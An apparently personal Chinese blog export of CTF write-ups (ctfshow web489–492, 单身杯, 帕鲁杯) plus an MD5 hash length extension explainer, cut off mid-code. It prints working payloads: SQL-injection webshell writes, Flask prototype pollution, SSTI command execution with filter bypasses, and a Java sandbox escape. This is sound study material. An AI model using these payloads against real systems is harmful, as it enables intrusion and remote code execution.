    <content><![CDATA[<h1 id="太久没更博客了，放假的时候放懒了，属于是放假前XXX放假后XXX了。下次暑假不能再在家里闲着了，得去打打HVV了。由于太久没更博客也不知道更些什么，就更一些刷题的过程吧。"><a href="#太久没更博客了，放假的时候放懒了，属于是放假前XXX放假后XXX了。下次暑假不能再在家里闲着了，得去打打HVV了。由于太久没更博客也不知道更些什么，就更一些刷题的过程吧。" class="headerlink" title="太久没更博客了，放假的时候放懒了，属于是放假前XXX放假后XXX了。下次暑假不能再在家里闲着了，得去打打HVV了。由于太久没更博客也不知道更些什么，就更一些刷题的过程吧。"></a>太久没更博客了，放假的时候放懒了，属于是放假前XXX放假后XXX了。下次暑假不能再在家里闲着了，得去打打HVV了。由于太久没更博客也不知道更些什么，就更一些刷题的过程吧。</h1><h1 id="ctfshow-web489"><a href="#ctfshow-web489" class="headerlink" title="ctfshow web489"></a>ctfshow web489</h1><p>这一题和web488很像算是升级版，所以我就记一下这一题。<br>首先我们可以再参数action下发现文件读取漏洞<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/1.png" class="" title="alt text"><br>但是经过尝试发现其并不会报错而web488存在报错，将源码扒下来。<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/2.png" class="" title="alt text"><br>回发现其再file_class.php添加了error_reporting(0);这导致网页没有报错。<br>我们审计代码会发现<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/3.png" class="" title="alt text"><br><code>extract($GET)</code>而这个函数就存在了参数覆盖，即我们可以直接覆盖sql这个变量来进行sql注入或者绕过登陆<br>但这还无法得到flag，这道题目需要我们根目录的flag。<br>进一步审代码会发现file_class.php下存在file_put_contents函数<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/4.png" class="" title="alt text"><br>那么思路就有了，我们一步步向上审代码<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/5.png" class="" title="alt text"><br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/6.png" class="" title="alt text"><br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/7.png" class="" title="alt text"><br>最终会再index.php发现只要我们成功登陆就可以通过操作username的值来操控content的值<br>而缓存<code>cache::create_cache</code>会在cache/md5(‘index’).php,下写入。<br>那么我们只要尝试绕过登陆。然后通过操控<code>$username</code>来写入webshell来读取文件<br>查看该代码会发现只要能查到内容即可以绕过验证我们直接使用<code>select+id+from+user+where+username=&#39;1&#39;+union+select+1</code>即可<br>而后再username传入webshell即可成功上马。<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/8.png" class="" title="alt text"></p>
<h1 id="ctfshow-web490"><a href="#ctfshow-web490" class="headerlink" title="ctfshow web490"></a>ctfshow web490</h1><p>与上一题相似但是其将extract()放在了<code>$sql</code>定义的上面导致无法使用变量覆盖来操控sql的值，但是其user处存在sql注入，而传入的<code>$template</code>变为了<code>$user-&gt;username</code>因为可以sql注入所有我们可以操控<code>$user-&gt;username</code>的值即我们可以写入webshell<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/9.png" class="" title="alt text"><br>而其shade进行了更改，其写入的value被<code>&lt;?=?&gt;</code>包裹即我们写入的webshell要进行更改<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/10.png" class="" title="alt text"><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=check&amp;username=1111&#x27;+union+select+&#x27;eval($_POST[1])&#x27;--+&amp;password=aaa</span><br></pre></td></tr></table></figure><br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/11.png" class=""><br>成功写入webshell后读取flag即可</p>
<h1 id="web491"><a href="#web491" class="headerlink" title="web491"></a>web491</h1><p>这题我们可以发现其无法再写入webshell了但是其还是存在sql注入，那么我们就可以尝试使用sql注入来读取文件，而因为这是盲注，所以我们可以使用脚本跑也可以产生些文件到/tmp这个低权限目录<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/12.png" class="" title="alt text"><br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/13.png" class="" title="alt text"><br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/14.png" class="" title="alt text"><br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/15.png" class="" title="alt text"></p>
<h1 id="web492"><a href="#web492" class="headerlink" title="web492"></a>web492</h1><img src="/2024/09/04/%E5%88%B7%E9%A2%98/16.png" class="">
<p>我们可以发现上述代码无法进行sql注入了。但是我们可以发现其user变量的值是再if条件里进行赋值的，那么我们只要使其无法被赋值的话，我们就可以使用extract函数来进行变量覆盖了<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/17.png" class="" title="alt text"></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>单身杯ctf</title>
    <url>/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/</url>
    <content><![CDATA[<h1 id="签到·好玩的PHP"><a href="#签到·好玩的PHP" class="headerlink" title="签到·好玩的PHP"></a>签到·好玩的PHP</h1><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241111-120847052.png" class="">  
<p>我们可以使用INF来绕过<br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-141956831.png" class=""><br>可以发现INF于”INF”的md5的值是一样的，而INF和字符串的”INF”是不同类型的使用不强相等<br>输出了INF。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">#highlight_file(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$d</span>=<span class="string">&quot;I&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$s</span>=<span class="string">&quot;N&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>=<span class="string">&quot;F&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$ctf</span>=INF;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;d = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;s = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;s;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable language_">$this</span>-&gt;d != <span class="variable language_">$this</span>-&gt;s) &amp;&amp; (<span class="variable language_">$this</span>-&gt;d != <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="variable language_">$this</span>-&gt;s != <span class="variable language_">$this</span>-&gt;b)) &#123;</span><br><span class="line">            <span class="variable">$dsb</span> = <span class="variable language_">$this</span>-&gt;d.<span class="variable language_">$this</span>-&gt;s.<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="title function_ invoke__">strlen</span>(<span class="variable">$dsb</span>) &lt;= <span class="number">3</span>) &amp;&amp; (<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;ctf) &lt;= <span class="number">3</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((<span class="variable">$dsb</span> !== <span class="variable language_">$this</span>-&gt;ctf) &amp;&amp; (<span class="variable language_">$this</span>-&gt;ctf !== <span class="variable">$dsb</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$dsb</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;ctf)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">#unserialize($b);</span></span><br></pre></td></tr></table></figure></p>
<h1 id="ez-inject"><a href="#ez-inject" class="headerlink" title="ez_inject"></a>ez_inject</h1><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-145137573.png" class="">  
<p>登陆后会发现hint是原型链污染<br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-145357514.png" class=""><br>在注册界面可以看到其后台处理json。我们尝试原型链污染<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;12344&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;app&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_static_folder&quot;</span><span class="punctuation">:</span><span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>而bao师傅说其并没有对污染的部分进行过滤。<br>那其实就有非常多的非预期了贴一个原型链污染的老文章<a href="https://www.cnblogs.com/Article-kelp/p/17068716.html">Python原型链污染变体(prototype-pollution-in-python)</a></p>
<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>预期解就是污染SECRET_KEY然后伪造session，然后再ssti<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;12344&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;config&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;SECRET_KEY&quot;</span> <span class="punctuation">:</span><span class="string">&quot;LSE&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>污染后使用flask-unsign来进行伪造<br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-151154154.png" class="">  </p>
<img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-151139127.png" class="">  
<p>成功伪造<br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-151313425.png" class=""><br>其提示我们再echo<br>其过滤了7*7等即我们无法通过算数来判断<br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-151411832.png" class=""><br>再输入url<em>for这种flask的内置函数会发生报错<br>直接输入<br><code>url_for.__globals__.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;nl /flag&#39;).read()</code><br>发现其进行了过滤，经过测试其过滤了<code>__globals__</code>和<code>__builtins__</code><br>如下可以绕过<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">url_for[<span class="string">&#x27;__gl&#x27;</span>+<span class="string">&#x27;obals__&#x27;</span>][<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;nl /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><br>然后其过滤了cat<br>经过尝试可以用nl来进行读取flag<br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-152157922.png" class=""><br>又是一个非预期<br>之后我有发现直接使用url<em>for得到open函数可以直接读取到内容<br>`url<em>for[‘<strong>gl’+’obals</strong>‘][‘<em>_buil’+’tins</em></em>‘][‘__import</em></em>‘](‘builtins’).open(‘/flag’).read()`<br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-153127887.png" class="">  </p>
<p>bao师傅其实是想让我们通过盲注来进行对flag的读取</p>
<img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-152431768.png" class="">  
<p>cycler[“<strong>in”+”it</strong>“][“<strong>glo”+”bals</strong>“][“<strong>bui”+”ltins</strong>“].<strong>import</strong>(‘builtins’).open(‘/flag’).read(1)[0]==’c’</p>
<h1 id="ez-ssti"><a href="#ez-ssti" class="headerlink" title="ez_ssti"></a>ez_ssti</h1><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-142256833.png" class="">  
<p>经过尝试发现其有长度限制，最多输入40字符。这就意味着无法使用fengjin一把梭。<br>于是我找到了这篇文章<a href="https://blog.csdn.net/weixin_43995419/article/details/126811287">ssti绕过长度限制</a><br>我们可以使用ssti来写入内容到config这种全局变量。这样就可以绕过长度限制了</p>
<p>文章是用<code>&#123;% set x=config.update(s='string') %&#125;</code>来进行修改的，而这题并没有过滤<code>&#123;&#123;&#125;&#125;</code>所以我们可以使用如下payload来写入<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.update(f=lipsum.__globals__)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(o=config.f.os)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(p=config.o.popen)&#125;&#125;</span><br><span class="line">&#123;&#123;config.p(&quot;cat /flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><br>在写入后可以直接使用<code>&#123;&#123;config&#125;&#125;</code>来看是否写入成功<br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-144004844.png" class=""><br>在赛后看了一下wp，发现出题人使用来写入update，这样来减小长度。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set x=config.update(a=config.update)%&#125;</span><br></pre></td></tr></table></figure><br>那么结合一下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.update(a=config.update)&#125;&#125;</span><br></pre></td></tr></table></figure><br>可以做到34字符进行rce</p>
<h1 id="迷雾重重"><a href="#迷雾重重" class="headerlink" title="迷雾重重"></a>迷雾重重</h1><h1 id="简单的文件上传"><a href="#简单的文件上传" class="headerlink" title="简单的文件上传"></a>简单的文件上传</h1><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241116-132538371.png" class="">  
<p>这道题目是一个上传jar包的程序，其可以上传jar包也可以运行和删除jar包。在尝试上传恶意Runtime的jar包后发现其无法运行，可以猜测到其一个是使用了Java Security Manager。<br><a href="http://www.mi1k7ea.com/2020/05/03/%E6%B5%85%E6%9E%90Java%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">浅析Java沙箱逃逸</a><br>参考这篇文章我们可以发现可以使用Java native方法来绕过沙箱。Java native是java调用执行其他语言的一种机制。其可以将so文件的代码进行加载。当我们调用native方法时，可以将调用的参数传到so文件的代码中且Java Security Manager。不会检测，这就导致了沙箱逃逸</p>
<p>我们随便上传一个文件，就可以知道上传的文件的上传位置是在/var/www/html/uploads/xxxx<br>那么我们可以在本地编写一个实现native的c语言编译的so文件。然后上传到该目录下，然后写一个jar包将native方法和调用其方法的class文件打包成一个jar包<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CTFshowCodeManager</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.load(<span class="string">&quot;/var/www/html/uploads/CTFshowCodeManager.jar&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">eval</span><span class="params">(String cmd)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        CTFshowCodeManager.eval(<span class="string">&quot;ls /&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>打包成jar包在和恶意so文件一起上传之后运行jar包即可查看根目录文件</p>
<img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241116-140142690.png" class="">  
<p>之后读取flag即可<br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241116-140256847.png" class="">  </p>
]]></content>
  </entry>
  <entry>
    <title>哈希扩展攻击</title>
    <url>/2024/04/24/%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="又是做xy学到的。xy真是每一题都在学习。"><a href="#又是做xy学到的。xy真是每一题都在学习。" class="headerlink" title="又是做xy学到的。xy真是每一题都在学习。"></a>又是做xy学到的。xy真是每一题都在学习。</h1><h1 id="md5加密"><a href="#md5加密" class="headerlink" title="md5加密"></a>md5加密</h1><p>我们先聊聊md5加密。</p>
<h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><p>我们会发现在md5加密后总是会输出一个128位的字符串，不管是多大的数据，因为md5是一个有损加密，这也就导致了我们认为md5加密不可逆。但是可以碰撞。<br>至于其加密流程我直接先贴个图<br><img src="/2024/04/24/%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/1.jpg" class="" title="alt text"></p>
<h3 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h3><p>加密的第一步就是填充。在进行md5加密时第一步就是填充，加密数据小于448位的数据会先先填充到448位填充的字符就是16进制的\x80\x00\x00\x00\x00。填充到448位最后的再写入64位的内容代表原数据的长度。补充到512位。如果数据大于512就补充道1024位。如果等于512也要补充到1024</p>
<h3 id="分组加密"><a href="#分组加密" class="headerlink" title="分组加密"></a>分组加密</h3><p>md5的加密是将数据按512一组分成多组与初始的幻数加密<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x67452301</span><br><span class="line">0xEFCDAB89</span><br><span class="line">0x98BADCFE</span><br><span class="line">0x10325476</span><br></pre></td></tr></table></figure><br>初始幻数与第一组进行一系列复杂的运算，得到第二组幻数，第二组幻数再与第而做的数据进行运算，以此类推到最后一组得到的四个最终的幻数进行下面的操作就是得到的md5值<br>假设最后得到的4组幻数都是0xabcdefgh<br>那么首先两两分组<br>得到<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ab cd ef gh</span><br><span class="line">ab cd ef gh</span><br><span class="line">ab cd ef gh</span><br><span class="line">ab cd ef gh</span><br></pre></td></tr></table></figure><br>再逆序拼接<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ghefcdabghefcdabghefcdabghefcdab</span><br></pre></td></tr></table></figure><br>这就是最终的md5值</p>
<h1 id="哈希扩展攻击的原理"><a href="#哈希扩展攻击的原理" class="headerlink" title="哈希扩展攻击的原理"></a>哈希扩展攻击的原理</h1><p>我们先看一下下面的demo<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$_flag</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span></span><br></pre></td></tr></table></figure><br>上面的demo给出了flag的md5值但是我们都知道md5是不可逆的，所以我们无法直接推导出flag。<br>那么我们来看一下if语句<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$_flag</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))</span><br></pre></td></tr></table></figure><br>我们可以看到我们可以控制字符与<code>$_flag</code>进行拼接，之后再与我们输入的md5值进行比较。<br>那么上面就出现了哈希扩展漏洞。我们都知道md5再加密直接回进行填充，而前一组的加密的结果会被当成后一组的幻数进行再一次的加密。<br>那么我们如果用输入的data来使得flag被正确填充到512位，再加密<code>md5($_flag.$_GET[&#39;data&#39;])</code>时第二组的幻数不就是第一组加密的值即flag的md5经过逆序的值吗?，那么我们知道了flag的md5值，即知道了第二组的幻数那么我们输入的md5值只要是以第二做的幻数为初始幻数加密的数据不就可以通过了吗?</p>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>我们要先知道$flag的长度（因为我们再对字符进行填充时最后的64位要为），不知道可以多次尝试来爆破。然后再进行填充如输入以下字段填充。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8000000000000000000....lalalalala</span><br></pre></td></tr></table></figure><br>而lalalala就是第二组的内容。<br>那么我们接下来就是利用第一组的加密结果即泄露的md5值的逆序来加密第二组数据。最终我们得到的加密结果就是<code>md5($_flag.$_GET[&#39;data&#39;])</code>这个结果。</p>
<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><p>上面的流程我们是不可能手打的我们可以使用脚本进行攻击<br>可能是因为环境原因我无法从GitHub上拉取hashpump，所以我这里用的是下面这个脚本<br>hash-ext-attack<br>流程就是按脚本提示的输入，攻击的条件就是已知长度，已知md5值，并且拼接进行比较</p>
]]></content>
      <categories>
        <category>trick</category>
        <category>哈希</category>
      </categories>
      <tags>
        <tag>哈希</tag>
      </tags>
  </entry>
  <entry>
    <title>帕鲁杯</title>
    <url>/2024/04/21/%E5%B8%95%E9%B2%81%E6%9D%AF/</url>
    <content><![CDATA[<h1 id="这个帕鲁杯主要考的是应急响应，本人是一点不会，所以就写了几题web-写了前三题感觉难度不是特别大-和最简单的几题应急响应，由于其是靶机代理的形式搞得web靶机，web靶机一直掉（扫后台还慢）所以我web最后一题就懒的写了，就去玩应急响应了。"><a href="#这个帕鲁杯主要考的是应急响应，本人是一点不会，所以就写了几题web-写了前三题感觉难度不是特别大-和最简单的几题应急响应，由于其是靶机代理的形式搞得web靶机，web靶机一直掉（扫后台还慢）所以我web最后一题就懒的写了，就去玩应急响应了。" class="headerlink" title="这个帕鲁杯主要考的是应急响应，本人是一点不会，所以就写了几题web(写了前三题感觉难度不是特别大)和最简单的几题应急响应，由于其是靶机代理的形式搞得web靶机，web靶机一直掉（扫后台还慢）所以我web最后一题就懒的写了，就去玩应急响应了。"></a>这个帕鲁杯主要考的是应急响应，本人是一点不会，所以就写了几题web(写了前三题感觉难度不是特别大)和最简单的几题应急响应，由于其是靶机代理的形式搞得web靶机，web靶机一直掉（扫后台还慢）所以我web最后一题就懒的写了，就去玩应急响应了。</h1><h1 id="web-签到"><a href="#web-签到" class="headerlink" title="web-签到"></a>web-签到</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag  <span class="comment"># 假设从 flag.py 文件中导入了 flag 函数</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getinfo</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> url:</span><br><span class="line">        <span class="comment"># 请求url</span></span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        content = response.text</span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;paluctf&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> content</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        response = &#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="number">200</span>,  <span class="comment"># 这里是数值，不是字符串</span></span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: <span class="string">&quot;Come sign in and get the flag!&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jsonify(response)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag1</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;paluctf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>签到题难度不高。<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getinfo</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> url:</span><br><span class="line">        <span class="comment"># 请求url</span></span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        content = response.text</span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;paluctf&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>我们可以看到只要让其访问的url响应里有paluctf就可以了。<br>一开始我是想ssrf来访问127.0.0.1的80端口的但是一直报错，所以我就直接开了vps服务让其访问，反正只要报文里只要有paluctf就行了。</p>
<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>由于本人还不会再vps上搭网站，但是问题不大可以直接创建一个文件名为paluctf的文件，再开启访问使其可以再公网上被访问这样响应就会有paluctf了<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo aaaa &gt; paluctf</span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><br><img src="/2024/04/21/%E5%B8%95%E9%B2%81%E6%9D%AF/1.png" class="" title="alt text"><br>直接让其访问<br>payload<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://xxx.xxx.xxx.xxx:8000</span><br></pre></td></tr></table></figure><br>即可得到flag</p>
<h1 id="R23"><a href="#R23" class="headerlink" title="R23"></a>R23</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span 